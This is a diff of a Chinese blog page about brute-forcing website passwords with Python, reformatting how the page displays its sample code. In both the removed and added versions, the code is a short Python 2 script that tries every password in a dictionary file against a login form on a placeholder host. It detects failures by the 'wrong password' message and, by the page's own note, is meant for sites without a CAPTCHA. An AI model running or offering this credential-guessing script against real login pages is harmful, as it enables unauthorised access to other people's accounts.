@@ -16,8 +16,7 @@
   
   
   
-    <meta name="description" content="根据字典文件,使用python进行暴力破解,程序很简单注：针对没有验证码的情况实例代码
- #encoding=utf-8    import httplib,urllib     conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)     f=open(&quot;dict.txt&quot;)     while 1:        ...">
+    <meta name="description" content="根据字典文件,使用python进行暴力破解,程序很简单注：针对没有验证码的情况实例代码1234567891011121314151617#encoding=utf-8import httplib,urllibconn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)f=open(&quot;dict.txt&quot;) while 1:   ...">
   
   <title>利用python进行暴力破解密码 [ shiny-boy ]</title>
   
@@ -140,8 +139,7 @@
       
     </p>
     
-    <p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码</p>
-<p> <code>#encoding=utf-8</code><br>    <code>import httplib,urllib</code><br>     <code>conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)</code><br>     <code>f=open(&quot;dict.txt&quot;)</code><br>     <code>while 1:</code><br>         <code>pwd=f.readline().strip()</code><br>         <code>if not pwd:</code><br>             <code>print &#39;字典已比对完。&#39;</code><br>             <code>break</code><br>         <code>params = urllib.urlencode({&#39;username&#39;: &#39;xxx&#39;, &#39;mod&#39;: &#39;&#39;, &#39;password&#39;: pwd})</code><br>         <code>headers = {&quot;Content-type&quot;:</code>   <code>` </code> “application/x-www-form-urlencoded”,”Accept”: “text/plain”} <code>` conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers)</code><br>        <code>r = conn.getresponse()</code><br>         <code>print r.status, r.reason</code><br>         <code>data1 = r.read().decode(&#39;gbk&#39;)#编码根据实际情况酌情处理</code><br>         <code>print data1.index(u&#39;您输入的密码有误&#39;),&#39;您输入的密码\&#39;%s\&#39;有误&#39;%pwd</code><br>     <code>conn.close()</code></p>
+    <p>根据字典文件,使用python进行暴力破解,程序很简单<br>注：针对没有验证码的情况<br>实例代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#encoding=utf-8</div><div class="line">import httplib,urllib</div><div class="line">conn = httplib.HTTPConnection(&quot;www.xxx.cn&quot;)</div><div class="line">f=open(&quot;dict.txt&quot;) </div><div class="line">while 1:</div><div class="line">    pwd=f.readline().strip()</div><div class="line">    if not pwd:</div><div class="line">        print &apos;字典已比对完。&apos; </div><div class="line">        break </div><div class="line">    params = urllib.urlencode(&#123;&apos;username&apos;: &apos;xxx&apos;, &apos;mod&apos;: &apos;&apos;, &apos;password&apos;: pwd&#125;) </div><div class="line">    headers = &#123;&quot;Content-type&quot;:  &quot;application/x-www-form-urlencoded&quot;,&quot;Accept&quot;: &quot;text/plain&quot;&#125; </div><div class="line">    conn.request(&quot;GET&quot;, &quot;/login/aaa.asp&quot;, params, headers) </div><div class="line">    r = conn.getresponse() </div><div class="line">    print r.status, r.reason </div><div class="line">    data1 = r.read().decode(&apos;gbk&apos;)#编码根据实际情况酌情处理  </div><div class="line">    print data1.index(u&apos;您输入的密码有误&apos;),&apos;您输入的密码\&apos;%s\&apos;有误&apos;%pwd </div><div class="line">  conn.close()</div></pre></td></tr></table></figure></p>
 
   </article>
   <div class="random-toc-area">
